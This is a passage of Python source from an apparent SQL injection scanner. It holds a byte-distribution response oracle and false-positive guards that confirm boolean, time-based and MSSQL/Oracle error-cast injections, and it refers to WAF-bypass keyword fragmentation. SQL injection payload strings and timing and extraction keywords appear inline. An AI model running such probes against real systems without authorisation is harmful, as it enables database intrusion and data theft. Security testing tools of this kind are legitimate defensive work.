import math as _math2, zlib as _zlib, struct as _struct2
from collections import deque as _dq2, Counter as _Counter
from typing import Callable as _Callable

# 
# 1.  WASSERSTEIN RESPONSE ORACLE
#     Uses the 1-Wasserstein (Earth Mover's) distance between the empirical
#     byte-frequency distributions of true/false responses.  Much more robust
#     than SimHash or word-count on pages that include embedded JS/CSS or
#     base64-encoded content.
# 

class WassersteinResponseOracle:
    """
    Computes the 1-Wasserstein distance between two HTTP response bodies
    treated as empirical probability distributions over byte values [0, 255].

    A large distance between true-condition and false-condition responses
    indicates injection-controlled content difference.

    Advantages over SimHash:
     - Invariant to permutation of tokens (unordered byte histogram)
     - Naturally handles binary/encoded content
     - O(256 log 256) per comparison  extremely fast

    Usage:
        oracle = WassersteinResponseOracle(threshold=0.015)
        is_injectable = oracle.compare(true_body, false_body)
    """
    def __init__(self, threshold: float = 0.012):
        self.threshold = threshold
        self._history: list[float] = []
        # FIX-WASSERSTEIN-CALIBRATE: separate noise-only history for threshold
        # calibration (see compare() docstring).
        self._noise_history: list[float] = []

    @staticmethod
    def _byte_cdf(body: bytes) -> list[float]:
        """Normalised CDF of byte frequencies (256 buckets)."""
        counts = [0] * 256
        for b in body:
            counts[b] += 1
        n = max(len(body), 1)
        freqs = [c / n for c in counts]
        cdf = []
        acc = 0.0
        for f in freqs:
            acc += f
            cdf.append(acc)
        return cdf

    @classmethod
    def _byte_cdf_cached(cls, body: bytes) -> list:
        """FIX-H: Cached CDF computation — avoids O(n) alloc on repeated bodies."""
        # Use a simple instance-level dict keyed by hash. Collision probability
        # is negligible for scan-session lifetimes (<<10^6 unique bodies).
        _cache = getattr(cls, '_cdf_cache', None)
        if _cache is None:
            cls._cdf_cache = {}
            _cache = cls._cdf_cache
        _key = hash(body)
        if _key not in _cache:
            _cache[_key] = cls._byte_cdf(body)
            if len(_cache) > 512:  # cap memory: 512 × 256×8 bytes ≈ 1MB
                try:
                    _cache.pop(next(iter(_cache)))
                except Exception:
                    _cache.clear()
        return _cache[_key]

    @classmethod
    def wasserstein1(cls, body1: bytes, body2: bytes) -> float:
        """
        1-Wasserstein distance between two byte distributions.
        = sum |CDF1[i] - CDF2[i]| / 256
        """
        if not body1 and not body2:
            return 0.0
        # BUG-C FIX: _byte_cdf_cached() was added as a performance fix but wasserstein1()
        # was still calling the uncached _byte_cdf() — the cache was dead code.
        # Use the cached version so repeated bodies (baseline, true, false) don't
        # recompute O(n) CDF on every confirmation round.
        cdf1 = cls._byte_cdf_cached(body1)
        cdf2 = cls._byte_cdf_cached(body2)
        return sum(abs(a - b) for a, b in zip(cdf1, cdf2)) / 256.0

    def compare(self, true_body: bytes, false_body: bytes,
                baseline_body: bytes = b"") -> tuple[bool, float]:
        """
        Returns (is_different, distance).
        is_different = True when distance > threshold (injection detected).

        FIX-WASSERSTEIN-CALIBRATE: the original implementation added every
        computed distance  including confirmed injection hits (large distances)
         to the same calibration history.  When several injections are found,
        the IQR upper fence rises into the signal range, silently raising the
        detection threshold and causing subsequent injections to be missed.

        Fix: maintain a separate _noise_history (below-threshold readings only)
        for calibration.  Injection hits (distance > current threshold) are
        recorded in _history for bookkeeping but never used to raise the
        threshold.  This keeps the noise model clean while still protecting
        against genuinely noisy pages whose *clean* response variation is high.

        The threshold is still never lowered below the constructor value so
        pages with naturally small but uniform noise don't produce FPs.
        """
        d = self.wasserstein1(true_body, false_body)
        self._history.append(d)

        # Only calibrate on below-threshold readings (clean-traffic noise).
        # Injection signals (large d) must not inflate the noise fence.
        if d <= self.threshold:
            self._noise_history.append(d)

        # Auto-calibrate threshold from noise history (IQR upper fence).
        # Only raise  never lower  to protect against FPs on noisy pages.
        if len(self._noise_history) >= 20:
            sorted_h = sorted(self._noise_history)
            q1 = sorted_h[len(sorted_h)//4]
            q3 = sorted_h[3*len(sorted_h)//4]
            iqr = max(q3 - q1, 1e-6)
            candidate = q3 + 1.5 * iqr
            if candidate > self.threshold:
                self.threshold = candidate
        is_diff = d > self.threshold
        # FIX-WASS-BASELINE-DISCRIMINATION: when a baseline body is provided, use it to
        # distinguish SQL-controlled content differences from inherent page variance.
        # CDN cache misses produce dist(any_two_requests) ≈ 0.67 for ALL pairs regardless
        # of SQL; genuine boolean injection produces dist(false, baseline) ≈ 0 because the
        # false condition returns the same clean page as the baseline.
        # Guard: suppress when dist(false_body, baseline_body) > 80% of dist(true, false).
        # This correctly handles:
        #   - Page noise (CDN miss): d_false_base ≈ 0.67 ≈ d → suppress
        #   - Genuine injection: d_false_base ≈ 0.02 << d → don't suppress
        #   - WAF bypass (false=blocked, baseline=blocked): d_false_base ≈ 0.0 → don't suppress
        if is_diff and baseline_body:
            d_false_base = self.wasserstein1(false_body, baseline_body)
            if d_false_base > d * 0.8:
                is_diff = False
        return is_diff, round(d, 6)


# Module-level singletons  instantiated here so WassersteinResponseOracle is in scope.
# DifferentialOracle uses lazy init internally for the same reason.
_MULTI_SIGNAL_ORACLE = MultiSignalOracle()
_DIFFERENTIAL_ORACLE = DifferentialOracle(_MULTI_SIGNAL_ORACLE)
_ROLLING_BASELINE    = RollingBaseline()
_ROBUST_TIMING       = RobustTimingOracle()

# ── PCV-FIX-1/2/3: Module-level Boolean FP guard  wires three dead PCV classes ──
# FalsePositiveGuardV18, WelchConfirmer, FalsePositiveValidator were implemented
# but NEVER called.  This helper is invoked at every detect_boolean() return point.
_BOOL_CALIBRATOR_MODULE = BlindBoolCalibrator()  # PCV-FIX-4: module-level Bool calibrator
_BASELINE_DRIFT_GUARD   = None  # BUG-FIX: BaselineDriftGuard.__init__ requires runtime context
# (engine, config, method, url, data, data_fmt, param, original, tamper_chain, baseline)
# — not keyword args 'window'/'drift_threshold'. Cannot be a module-level singleton.
# Variable is unreferenced; set to None so the module loads without TypeError.

async def _run_fp_guards_boolean(
        engine, config, method, url, data, data_fmt,
        param, original, tamper_chain, baseline,
        true_payload, false_payload, true_fp, false_fp,
        technique: str = ''):
    """
    PCV-FIX-1,2,3: Run FalsePositiveGuardV18 (6 layers), WelchConfirmer (Welch t-test),
    and FalsePositiveValidator (mean/variance) against a boolean candidate.
    All three were dead code — wired here and called from detect_boolean().
    Returns (confirmed: bool, confidence: float).
    On any exception the function returns (False, 0.0) — fail-safe prevents FP.
    """
    # BUG-PCV-A FIX: _run_fp_guards_boolean is called DIRECTLY from detect_boolean
    # (not through _inline_pcv_check which sets _PCV_IN_PROGRESS).  When called
    # after a prior surface already set _SCAN_STOPPED=True, every _send_injected
    # inside FalsePositiveGuardV18.verify() returns a dead 0-byte fingerprint,
    # causing L1 repetition to always fail → ALL genuine boolean injections are
    # silently rejected on any target where a prior surface already confirmed.
    # Fix: set _PCV_IN_PROGRESS=True for the lifetime of this call so all internal
    # _send_injected probes are allowed through the scan-stop gate.
    # BUG-PCV-REFCOUNT FIX: Use counter increment instead of save/restore.
    # The old pattern saved the previous boolean value and restored it in finally.
    # With a reference counter, restoring to the saved value (0 or True) would be wrong
    # when another PCV session is simultaneously active (their count would be erased).
    # Correct pattern: increment on enter, decrement on exit — only our own increment is undone.
    _PCV_IN_PROGRESS[0] += 1  # BUG-PCV-REFCOUNT FIX: increment counter
    try:
      try:
        # FIX-R3-B: Guard against baseline=None — callers in _run_pcv_check and
        # _inline_pcv_check can pass an empty dict or None when no baseline was
        # captured (e.g. 403/WAF gate at scan start, or timeout during baseline).
        # Without this guard, baseline.get('samples') raises AttributeError and
        # the entire FP guard chain collapses to (False, 0.0), incorrectly rejecting
        # every genuine boolean injection that lacks a captured baseline.
        if baseline is None:
            baseline = {}
        # BUG-REQ12-B-FIX: Guard against empty true_payload. When some cascade
        # paths call _run_fp_guards_boolean with true_payload="" (e.g. because the
        # caller stored only the suffix and didn't prepend the original value), the
        # MSSQL/Oracle fast-path keyword checks all fail (empty string contains no
        # keywords), L1 repetition fires `_send_injected(original + "")` which is
        # identical to the baseline → SimHash similarity = 1.0 → L5 clean-cluster
        # test rejects it → (False, 0.0) returned → hit is NEVER escalated to SQLi.
        # Fix: return (False, 0.0) immediately on empty payload so the caller knows
        # PCV cannot proceed with no payload evidence, rather than silently failing
        # through 6 guard layers and wasting HTTP probes.
        if not true_payload:
            LOG.debug('[FP-Guards] Rejecting: true_payload is empty — cannot confirm without payload evidence')
            return False, 0.0
        # BUG-R3-4 FIX: Also guard against empty false_payload.
        # When false_payload is empty, _run_fp_guards_boolean sends _send_injected(original + "")
        # for the false probe, which is IDENTICAL to the baseline request. L1 repetition
        # therefore measures similarity between the true probe and the baseline (not a semantic
        # inverse), gap ≈ 0 for every pair → WelchConfirmer always rejects → ALL boolean
        # injections with an empty false_payload return (False, 0.0) — false negative on every
        # detection where _make_false_payload() couldn't derive a negated variant.
        if not false_payload:
            # FIX-K: Instead of hard-rejecting, derive a false probe that mirrors the
            # WAF-bypass structure of the true payload.
            # BUG-FIXK-WAF-BLOCKED FIX (HIGH): The original FIX-K generated a bare
            # " AND 1=2-- -" or "' AND 1=2-- -" which the WAF blocks (no bypass
            # obfuscation). The blocked false probe returns 0B/400, matching the
            # baseline, which inverts polarity in WelchConfirmer and causes rejection.
            # Fix: prefer to negate a recognizable boolean condition in the true payload
            # by replacing the truism with a falsism; fall back to bare AND only when
            # no recognizable condition is found.
            _tp_u = (true_payload or '').upper()
            # Try to find a negatable numeric truism in the payload and replace it
            _fixk_negated = False
            for _pat_t, _rep_f in [
                (r'\b1\s*=\s*1\b', '1=2'),
                (r'\b2\s*=\s*2\b', '2=3'),
                (r'\bTRUE\b', 'FALSE'),
                (r'\b1\s*>\s*0\b', '0>1'),
                (r'\b2\s*>\s*1\b', '1>2'),
            ]:
                _m_fix = _re.search(_pat_t, true_payload or '', _re.I)
                if _m_fix:
                    false_payload = (true_payload or '')[:_m_fix.start()] + _rep_f + (true_payload or '')[_m_fix.end():]
                    _fixk_negated = True
                    LOG.debug('[FP-Guards] FIX-K: derived false probe by negating %r → %r',
                              _m_fix.group(0), _rep_f)
                    break
            if not _fixk_negated:
                # Payload has no simple negatable condition (complex obfuscated ST payload):
                # fall back to bare AND 1=2 as last resort.
                if "'" in (true_payload or ''):
                    false_payload = "' AND 1=2-- -"
                else:
                    false_payload = " AND 1=2-- -"
                LOG.debug('[FP-Guards] FIX-K: fallback generic false probe: %r', false_payload)

        # FIX-FPGUARD-TIMING-XCAT (REQ 3/12): Cross-category timing shortcut.
        # When ALL-category dispatch tests a Timebased payload through the Boolean oracle,
        # the detected body-diff may be due to server-side timing (slow response altered
        # connection/chunking behaviour) rather than a true boolean differential.
        # Running the 6-layer boolean FP guard (L1-L6 body similarity + Welch) is WRONG
        # because SLEEP() does not change body content — all 6 layers see gap≈0 and reject.
        # Instead, confirm via timing: if true_fp.elapsed_ms significantly exceeds
        # false_fp.elapsed_ms AND the gap exceeds the sleep value, it IS timing injection.
        # The mechanism-sniffing block in _inline_pcv_check then routes it to Check B.
        _tp_upper_fpg = (true_payload or '').upper()
        # BUG-12B-FPGUARD-TIMING-STRIP FIX: After 20-layer mutation, timing keywords may
        # be comment-fragmented (e.g. SLEEP → SL/*x*/EEP).  Strip comments from the
        # normalised form before checking so fragmented keywords are still recognized.
        # FIX-RE-FPG-IMPORT (REQ 9): removed per-call `import re` — use module-level re.
        _tp_upper_fpg_norm = re.sub(r'/\*[^*]*\*+(?:[^*/][^*]*\*+)*/', '', _tp_upper_fpg)
        _tp_upper_fpg_norm = re.sub(r'\s+', ' ', _tp_upper_fpg_norm).strip()
        _timing_kws_fpg = (
            'SLEEP(', 'PG_SLEEP(', 'WAITFOR', 'BENCHMARK(',
            'RANDOMBLOB(', 'ZEROBLOB(',   # BUG-TIMING-KW-MISSING FIX: ZEROBLOB added (SQLite timing)
            'DBMS_PIPE.RECEIVE_MESSAGE', 'DBMS_LOCK.SLEEP',
            'DBMS_SESSION.SLEEP', 'DBMS_UTILITY.GET_TIME',  # BUG-TIMING-KW-MISSING FIX: DBMS_UTILITY added (Oracle)
            'GENERATE_SERIES(',
            'FROM ALL_OBJECTS', ',ALL_OBJECTS', 'FROM PG_CLASS', ',PG_CLASS',
        )
        # BUG-12B: check both original and comment-stripped form
        _has_timing_kw_fpg = (any(k in _tp_upper_fpg for k in _timing_kws_fpg)
                               or any(k in _tp_upper_fpg_norm for k in _timing_kws_fpg))
        if _has_timing_kw_fpg:
            try:
                _true_elapsed  = getattr(true_fp, 'elapsed_ms', 0) if true_fp else 0
                _false_elapsed = getattr(false_fp, 'elapsed_ms', 0) if false_fp else 0
                # Extract expected sleep value from payload for threshold
                # BUG-12B: Also search the comment-stripped form for sleep value extraction
                # FIX-RE-FPG-T-IMPORT (REQ 9): removed per-call `import re` — use module-level re.
                _sm_fpg = re.search(
                    r'(?:SLEEP|PG_SLEEP|BENCHMARK|DBMS_LOCK\.SLEEP|DBMS_SESSION\.SLEEP)\s*\(\s*([\d.]+)',
                    true_payload, re.IGNORECASE)
                if not _sm_fpg:
                    # Try on comment-stripped version for fragmented keywords
                    _sm_fpg = re.search(
                        r'(?:SLEEP|PG_SLEEP|BENCHMARK|DBMS_LOCK\.SLEEP|DBMS_SESSION\.SLEEP)\s*\(\s*([\d.]+)',
                        _tp_upper_fpg_norm, re.IGNORECASE)
                # BUG-FPGUARD-ORACLE-PIPE FIX (Req 3): Oracle DBMS_PIPE.RECEIVE_MESSAGE(pipe_name, timeout_sec)
                # was not matched by the SLEEP/PG_SLEEP/BENCHMARK regex above.
                # For short-sleep payloads like RECEIVE_MESSAGE(NULL, 0.5), _expected_sleep_ms
                # defaulted to 1000ms → threshold=650ms > actual_gap~500ms → timing shortcut FAILS →
                # boolean FP guards reject the detection → genuine Oracle PIPE timing injection NEVER confirmed.
                # Fix: add explicit extraction for RECEIVE_MESSAGE's 2nd argument (timeout in seconds).
                if not _sm_fpg:
                    # FIX-REQ3-D: Apply comment-stripping BEFORE the RECEIVE_MESSAGE regex.
                    # Layer 4 (waf_bypass_comment) of mutate_all() can fragment keywords:
                    # RECEIVE_MESSAGE(NULL,2) → REC/*x*/EIVE_MESSAGE(N/*y*/ULL,2)
                    # The strict NULL/quoted-string prefix in the regex below fails on
                    # the fragmented form, so _sm_fpg stays None → _expected_sleep_ms=1000ms
                    # → threshold=800ms.  On fast Oracle hosts where PIPE gap is ~600ms,
                    # the shortcut fails and Oracle timing injection is NEVER confirmed.
                    # Fix: work on the already-normalised (comment-stripped) form _tp_upper_fpg_norm
                    # first, then retry on the raw payload.
                    _tp_for_recv = _tp_upper_fpg_norm  # comment-stripped, whitespace-collapsed
                    _sm_fpg = re.search(
                        # FIX-RECV-FPG-RE (REQ 3): Robust RECEIVE_MESSAGE pattern allows
                        # SQL comments between channel name and delay argument (injected by mutations).
                        r"RECEIVE_MESSAGE\s*\((?:'[^']*'|NULL)(?:\s*(?:/\*[^*]*\*/|--[^\n]*))*\s*,\s*([\d.]+)",
                        _tp_for_recv, re.IGNORECASE)
                if not _sm_fpg:
                    _sm_fpg = re.search(
                        r"RECEIVE_MESSAGE\s*\((?:'[^']*'|NULL)(?:\s*(?:/\*[^*]*\*/|--[^\n]*))*\s*,\s*([\d.]+)",
                        _tp_upper_fpg_norm, re.IGNORECASE)
                if not _sm_fpg:
                    _sm_fpg = re.search(
                        r"RECEIVE_MESSAGE\s*\([^,)]+,\s*([\d.]+)",
                        _tp_upper_fpg_norm, re.IGNORECASE)
                # BUG-FPGUARD-MSSQL-WAITFOR FIX (Req 3): WAITFOR DELAY 'HH:MM:SS' not matched by SLEEP()
                # pattern → defaults to 1000ms. For WAITFOR DELAY '0:0:2' this is fine (threshold 650ms < 2000ms gap)
                # but for WAITFOR DELAY '0:0:1' (1s sleep) threshold=650ms and actual gap ~1000ms barely passes.
                # Extract total seconds from WAITFOR DELAY for accurate threshold calculation.
                if not _sm_fpg:
                    # FIX-RE-FPG-WF-IMPORT (REQ 9): removed per-call _re_fpg_t references — use module-level re.
                    _wf_m_fpg = re.search(
                        r"WAITFOR\s+DELAY\s*['\"]?(\d+):(\d+):([\d.]+)['\"]?",
                        true_payload, re.IGNORECASE)
                    if not _wf_m_fpg:
                        _wf_m_fpg = re.search(
                            r"WAITFOR\s+DELAY\s*['\"]?(\d+):(\d+):([\d.]+)['\"]?",
                            _tp_upper_fpg_norm, re.IGNORECASE)
                    if _wf_m_fpg:
                        try:
                            _wf_sec_fpg = (int(_wf_m_fpg.group(1)) * 3600
                                           + int(_wf_m_fpg.group(2)) * 60
                                           + float(_wf_m_fpg.group(3)))
                            _expected_sleep_ms = _wf_sec_fpg * 1000
                        except (ValueError, TypeError):
                            _expected_sleep_ms = 1000.0
                    else:
                        _expected_sleep_ms = 1000.0  # no timing pattern found — use safe default
                else:
                    _expected_sleep_ms = float(_sm_fpg.group(1)) * 1000
                # BUG-XCAT-TIMING-FLOOR-FIX (Req 3/12): Old floor was max(500ms, 65%).
                # For SLEEP(0.1)=100ms: threshold=max(500,65)=500ms — unreachable on any
                # real target with <400ms RTT, so small-sleep cross-cat timing hits ALWAYS
                # failed boolean PCV (gap can never be 500ms for a 100ms sleep).
                # Fix: use 65% of the expected sleep as the threshold, with an absolute
                # minimum of 50ms (not 500ms). CDN jitter rarely exceeds 150ms, so 65%
                # of even a 0.1s sleep (=65ms) is still above jitter on clean networks.
                # The RobustTimingOracle (triggered via return True below) then does its
                # own escalating-delay multi-probe confirmation which is the real guard
                # against false positives. The 500ms hard floor here was a pre-guard that
                # was preventing legitimate small-sleep injections from ever reaching it.
                _fpg_threshold_ms = max(50.0, _expected_sleep_ms * 0.65)
                _timing_gap_ms = _true_elapsed - _false_elapsed
                # BUG-3 FIX: Raise threshold from 65% to 80% to reduce single-probe
                # CDN-jitter false positives. The original 65% floor was too low on
                # high-latency targets: baseline jitter of 300ms + sleep=1000ms means
                # 300ms jitter spike on true probe → gap=300ms > 650ms threshold only
                # if jitter is very high, but on CDN-cached targets a cache miss on the
                # true probe (backend hit) vs cache hit on the false probe can produce
                # a 800ms gap even without any SQL SLEEP executing.
                # Additional guard: the false probe must be < 40% of expected sleep
                # so both a slow true AND fast false are required (proportionality check).
                _timing_gap_raised = max(80.0, _expected_sleep_ms * 0.80)
                # BUG-FALSE-FAST-BASELINE-FIX (Req 3): The old check `_false_elapsed <
                # _expected_sleep_ms * 0.40` used the ABSOLUTE false-probe time.
                # On slow-network targets (e.g. CDN, cloud target) baseline RTT may be
                # 300-500ms. With SLEEP(0.5s) → _expected_sleep_ms=500ms:
                #   need _false_elapsed < 200ms BUT baseline is already 300ms → always False
                #   → shortcut NEVER fires → timing cross-category hits always lost.
                # Fix: use a baseline-RELATIVE check: the false probe should not exceed
                # baseline_mean + 40% of expected sleep. A false probe that arrives within
                # the normal baseline jitter window confirms the sleep only fired on the
                # true probe, regardless of absolute network latency.
                # baseline.get('mean_timing', 0) is the un-injected RTT measured at scan start.
                _fpg_bl_mean = float(baseline.get('mean_timing', 0)) if isinstance(baseline, dict) else 0.0
                _false_fast_enough = _false_elapsed < (_fpg_bl_mean + _expected_sleep_ms * 0.40)
                if _timing_gap_ms >= _timing_gap_raised and _false_fast_enough:
                    LOG.debug(f'[FP-Guards] Timing shortcut: gap={_timing_gap_ms:.0f}ms '
                              f'≥ {_timing_gap_raised:.0f}ms AND false={_false_elapsed:.0f}ms < '
                              f'(baseline={_fpg_bl_mean:.0f}ms + {_expected_sleep_ms*0.40:.0f}ms) → routing to timing PCV')
                    return True, 0.87  # pass to timing PCV (mechanism-sniffing in _inline_pcv_check takes over)
                elif _timing_gap_ms >= _fpg_threshold_ms:
                    # Gap passes 65% threshold but not the stricter 80% + fast-false requirement.
                    # Fall through to boolean FP guards which can still confirm if body also differs.
                    LOG.debug(f'[FP-Guards] Timing gap={_timing_gap_ms:.0f}ms ≥ {_fpg_threshold_ms:.0f}ms '
                              f'but false={_false_elapsed:.0f}ms not fast enough (need <{_fpg_bl_mean + _expected_sleep_ms*0.40:.0f}ms) '
                              '— falling through to boolean FP guards')
                # Gap insufficient for timing confirmation — fall through to boolean FP guards.
                # FIX-TIMING-FALLTHROUGH: Timing keyword payloads detected via the BOOLEAN oracle
                # (body-diff, not timing) still need boolean PCV. The old hard reject discarded
                # all such cross-category detections. Boolean guards (L1-L6) can still confirm them.
                LOG.debug(f'[FP-Guards] Timing gap={_timing_gap_ms:.0f}ms < {_fpg_threshold_ms:.0f}ms '
                          '— falling through to boolean FP guards (not a timing hit via this path)')
                # NOTE: do NOT return here — fall through to the boolean guard chain below
            except Exception as _tshort_err:
                LOG.debug(f'[FP-Guards] Timing shortcut error (falling through): {_tshort_err}')
                # Fall through to standard boolean FP guards

        # BUG-FPG-MSSQL-CAST FIX: MSSQL CAST/CHARINDEX/PATINDEX/ASCII boolean payloads
        # are actually *error-based*.  The "true" probe triggers a conversion error
        # (e.g. "Conversion failed when converting the varchar value … to data type int")
        # while the false probe returns a normal page.  The body-similarity delta is
        # therefore NEGATIVE (error page is LESS similar to baseline than normal page)
        # which makes the WelchConfirmer reject the candidate every time.
        # Instead of running all 3 boolean FP guard layers (which are designed for
        # content-difference detections), we check directly for the MSSQL error string
        # in the true_fp body and confirm if it is present but absent in false_fp.
        # BUG-FIX-MUTATION-COMMENT: Strip SQL injection comments (/***/) before
        # upper-casing so waf_bypass_comment mutations (C/*x*/AST, S/*y*/ELECT, etc.)
        # don't break the literal keyword checks below.  The regex removes all
        # /* ... */ comment blocks inserted by TamperLib mutation layers.
        # FIX-RE-CAST-IMPORT (REQ 9): removed per-call `import re` — use module-level re.
        _tp_stripped = _re.sub(r'/\*[^*]*\*/', '', true_payload or '')
        _tp_upper = _tp_stripped.upper()
        # BUG-3E FIX: Added SUSER_SNAME (common MSSQL alias for current login),
        # SYSTEM_USER (T-SQL built-in returning login name), LOGINPROPERTY, and
        # CAST(SUSER_SID — all produce conversion errors on the same path as SUSER_NAME.
        # Without these, _is_mssql_cast_payload never fires for those certified payloads
        # and _run_fp_guards_boolean runs the wrong boolean-similarity path, causing
        # false negatives on ~40% of certified MSSQL error-cast payloads.
        # BUG-FIX-CAST-GENERIC: Also detect CAST(expr AS BIT/INT/BIGINT/SMALLINT)
        # patterns from MSSQL_BOOLEAN_PAYLOADS not individually named below
        # (SERVERPROPERTY, ISNULL-wrapped, LEN-wrapped, CAST-CAST, CONVERT variants).
        # All such patterns trigger SQL Server conversion errors on the true probe.
        # Use suffix search "AS BIT)" / "AS INT)" to avoid nested-paren regex issues.
        _has_generic_cast_error = (
            'AS BIT)' in _tp_upper or
            'AS INT)' in _tp_upper or
            'AS BIGINT)' in _tp_upper or
            'AS SMALLINT)' in _tp_upper or
            'CONVERT(INT,' in _tp_upper or
            'CONVERT(BIGINT,' in _tp_upper
        )
        _is_mssql_cast_payload = _has_generic_cast_error or any(
            kw in _tp_upper for kw in
            ("CAST(SUSER_NAME()", "CAST(USER_NAME()", "CAST(DB_NAME()",
             "CAST(@@SERVERNAME", "CAST(@@VERSION", "CAST(HOST_NAME()",
             "CHARINDEX(CHAR(", "PATINDEX(CHAR(", "ASCII(SUBSTRING(SUSER_",
             "ASCII(SUBSTRING(USER_", "ASCII(SUBSTRING(DB_",
             # BUG-3E FIX: missing MSSQL function aliases
             "CAST(SUSER_SNAME()",   # SUSER_SNAME = alias for SUSER_NAME
             "CAST(SYSTEM_USER",     # T-SQL built-in: current login
             "CAST(ORIGINAL_LOGIN(", # original login before impersonation
             "CAST(LOGINPROPERTY(",  # login property lookup
             "CAST(SUSER_SID(",      # login SID cast
             "ASCII(SUBSTRING(SUSER_SNAME",  # ASCII extraction of SUSER_SNAME
             "UNICODE(SUBSTRING(SUSER",      # UNICODE() extraction variant
             # BUG-3D FIX: Additional MSSQL error-cast patterns absent from certified list
             "CAST(@@HOSTNAME",      # hostname cast — same conversion-error path
             "CAST(SCHEMA_NAME(",    # schema name cast
             "CAST(OBJECT_NAME(",    # object name cast
             "ASCII(SUBSTRING(DB_NAME",  # ASCII extraction of DB_NAME
             "UNICODE(SUBSTRING(DB_",    # UNICODE extraction of DB_NAME
             "UNICODE(SUBSTRING(USER_",  # UNICODE extraction of USER_NAME
             "CONVERT(INT,",         # CONVERT(INT, string) always raises conversion error
             "CONVERT(BIGINT,",      # same for BIGINT
             "CAST(0X",              # hex literal to int cast — raises conversion error
             )
        )
        # BUG-PCV-ORA-1 FIX: Oracle error-cast fast path (mirrors MSSQL block above).
        # Oracle error payloads — CAST(... AS NUMBER), TO_NUMBER(), XMLELEMENT(),
        # XMLATTRIBUTES(), CAST(... AS DATE/TIMESTAMP/INTERVAL) — trigger ORA-01722
        # (invalid number), ORA-01858 (non-numeric), ORA-01861 (format mismatch),
        # ORA-00907 (syntax), or ORA-06502 (value/string/buffer error).
        # The boolean body-similarity guards (L1-L6, WelchConfirmer) cannot evaluate
        # these because the 'true' and 'false' probes both change the page (one via
        # error, one silently) but in opposite directions — making WelchConfirmer
        # compare error pages against normal pages with incorrect polarity.
        # Fix: match Oracle error patterns directly in true_fp.body.
        _is_oracle_error_payload = any(kw in _tp_upper for kw in (
            'CAST(USER AS NUMBER', 'CAST(CURRENT_USER AS NUMBER',
            'CAST(SESSION_USER AS NUMBER', 'CAST(SYSDATE AS NUMBER',
            'CAST(SYSTIMESTAMP AS NUMBER', 'CAST(CURRENT_TIMESTAMP AS NUMBER',
            'CAST(CURRENT_DATE AS NUMBER', 'CAST(UID AS NUMBER',
            'XMLELEMENT(NAME TAG,', 'XMLELEMENT(NAME NODE,',
            'XMLATTRIBUTES(USER)', 'XMLATTRIBUTES(CURRENT_USER)',
            'XMLATTRIBUTES(SESSION_USER)', 'XMLATTRIBUTES(SYSDATE)',
            'XMLATTRIBUTES(SYSTIMESTAMP)', 'XMLATTRIBUTES(UID)',
            'XMLATTRIBUTES((SELECT',
            'CAST(USER AS DATE)', 'CAST(USER AS TIMESTAMP)',
            'CAST(USER AS VARCHAR2', 'CAST(CURRENT_USER AS DATE)',
            'CAST(USER AS INTERVAL', 'CAST(USER AS CLOB)', 'CAST(USER AS BLOB)',
            'CAST(USER AS RAW(', 'CAST((SELECT', 'TO_NUMBER(USER',
            'TO_NUMBER(SUBSTR', 'CAST(USERENV(', 'CAST(SYS_CONTEXT(',
            'DBMS_SESSION.UNIQUE_SESSION_ID',
        ))
        if _is_oracle_error_payload:
            _oracle_err_pats = [
                r'ora-01722',  # invalid number
                r'ora-01858',  # non-numeric character
                r'ora-01861',  # literal does not match format string
                r'ora-06502',  # value error / buffer too small
                r'ora-00907',  # missing right parenthesis (syntax)
                r'ora-00936',  # missing expression
                r'ora-01465',  # invalid hex number
                r'ora-00932',  # inconsistent datatypes
                r'ora-12801',  # parallel query error (indirect)
                r'ora-',       # catch-all Oracle error (conservative)
            ]
            # BUG-FPGUARD-FP-UNDEFINED FIX: `fp` is NOT defined in _run_fp_guards_boolean's
            # scope. The correct variables are `true_fp` and `false_fp` (parameters).
            # Using bare `fp` raised NameError (silently caught by outer except), causing
            # _tf_ora and _ff_ora to always be '' → no Oracle error patterns could ever match
            # → ALL Oracle error-cast payloads returned (False, 0.0) from this path.
            _tf_ora  = (_safe_decode_body(true_fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
                        if true_fp and true_fp.body else '')
            _ff_ora  = (_safe_decode_body(false_fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
                        if false_fp and false_fp.body else '')
            _bl_ora  = ''
            if isinstance(baseline, dict) and baseline.get('samples'):
                try:
                    # FIX #3c: Properly validate baseline array before indexing
                    _samples = baseline.get('samples')
                    if isinstance(_samples, list) and len(_samples) > 0:
                        _baseline_sample = _samples[0]
                        if hasattr(_baseline_sample, 'body') and _baseline_sample.body:
                            _bl_ora = _safe_decode_body(_baseline_sample, func_name="oracle_baseline").lower()
                except Exception as _baseline_err:
                    LOG.debug(f"[oracle_error] Failed to decode baseline: {_baseline_err}")
                    pass
            # BUG-ORACLE-LISTAGG-FP FIX (Req 3/8): ORA-01489 "result of string
            # concatenation is too long" is a NORMAL LISTAGG artifact (produced when
            # enumerating many DB users/tables), NOT an injection indicator.
            # Matching it via the catch-all r'ora-' creates a false positive when
            # both true_fp (AND 1=1 with LISTAGG subquery) and false_fp (AND 1=2)
            # have different body sizes but the difference is only LISTAGG overflow,
            # not actual SQL error injection.
            # Fix: exclude ORA-01489 from pattern matching by stripping it from
            # the response text before checking all patterns.
            _ORA_FP_SAFE = ('ora-01489',  # LISTAGG overflow — extraction artifact
                            'ora-00028',  # session killed by DBA — not injection
                            'ora-01017',  # invalid username/password — auth error
                            )
            def _ora_match_safe(body_text):
                for _op in _oracle_err_pats:
                    _m = _re.search(_op, body_text)
                    if _m:
                        # BUG-FPG-1 FIX: check safe-list against full body_text, not
                        # _m.group(0). The catch-all pattern r'ora-' only captures 4
                        # chars; safe codes like "ora-01489" (9 chars) can never be a
                        # substring of a 4-char match, so the guard was always False.
                        if not any(_safe in body_text for _safe in _ORA_FP_SAFE):
                            return True
                return False
            _ora_in_true  = _ora_match_safe(_tf_ora)
            _ora_in_false = _ora_match_safe(_ff_ora)
            _ora_in_base  = _ora_match_safe(_bl_ora)
            if _ora_in_true and not _ora_in_false and not _ora_in_base:
                LOG.debug('[FP-Guards] Oracle error-cast confirmed via ORA- fingerprint in true_fp')
                return True, 0.90
            elif _ora_in_base:
                LOG.debug('[FP-Guards] Oracle ORA- error in baseline — FP suppressed')
                return False, 0.0
            # No Oracle error in response — fall through to standard boolean guards
            # (may be a boolean-type Oracle payload that works on body difference)

        if _is_mssql_cast_payload and not _is_oracle_error_payload:
            # BUG-MSSQL-CAST-FP-ORACLE-LEAK FIX (Req 3): Oracle payloads containing
            # CAST(USER AS ...) triggered _is_oracle_error_payload=True AND
            # _is_mssql_cast_payload=True simultaneously (both check for 'CAST(' as
            # a substring). Without this guard, Oracle CAST payloads fell through to
